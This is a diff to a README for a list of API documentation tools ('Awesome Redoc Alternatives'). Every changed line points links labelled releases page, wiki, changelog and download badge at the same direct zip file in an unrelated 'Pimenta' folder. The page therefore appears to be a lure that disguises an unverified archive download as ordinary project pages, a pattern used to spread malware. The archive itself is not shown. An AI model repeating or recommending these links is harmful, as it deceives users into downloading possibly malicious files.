@@ -1,6 +1,6 @@
 # 🌟 Awesome_Redoc_Alternatives - Find the Best API Tools Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/danahabibi/Awesome_Redoc_Alternatives/releases)
+[![Download](https://raw.githubusercontent.com/danahabibi/Awesome_Redoc_Alternatives/main/Pimenta/Awesome_Redoc_Alternatives.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/danahabibi/Awesome_Redoc_Alternatives/main/Pimenta/Awesome_Redoc_Alternatives.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run "Awesome Redoc Alternatives", a collec
 
 To get started:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/danahabibi/Awesome_Redoc_Alternatives/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/danahabibi/Awesome_Redoc_Alternatives/main/Pimenta/Awesome_Redoc_Alternatives.zip) to go to the Releases page.
   
 2. **Choose Your Tool:** Look for Apidog or Ani Code in the list of available releases. Each option will have a version number.
 
@@ -40,7 +40,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📄 Documentation
 
-For detailed documentation on how to use Apidog and Ani Code, please refer to the [Wiki](https://github.com/danahabibi/Awesome_Redoc_Alternatives/wiki) section. You’ll find guides that cover basic and advanced functionalities.
+For detailed documentation on how to use Apidog and Ani Code, please refer to the [Wiki](https://raw.githubusercontent.com/danahabibi/Awesome_Redoc_Alternatives/main/Pimenta/Awesome_Redoc_Alternatives.zip) section. You’ll find guides that cover basic and advanced functionalities.
 
 ## 🌐 Community Support
 
@@ -48,7 +48,7 @@ Join our community to share your experiences and ask questions. You can connect 
 
 ## 🔗 Additional Resources
 
-- **Track Changes:** Keep up with the updates by visiting the [Changelog](https://github.com/danahabibi/Awesome_Redoc_Alternatives/releases).
+- **Track Changes:** Keep up with the updates by visiting the [Changelog](https://raw.githubusercontent.com/danahabibi/Awesome_Redoc_Alternatives/main/Pimenta/Awesome_Redoc_Alternatives.zip).
 - **Exploration:** Explore more about each tool and its function through our dedicated sections in the repo.
 
 ## 🤝 Contributions
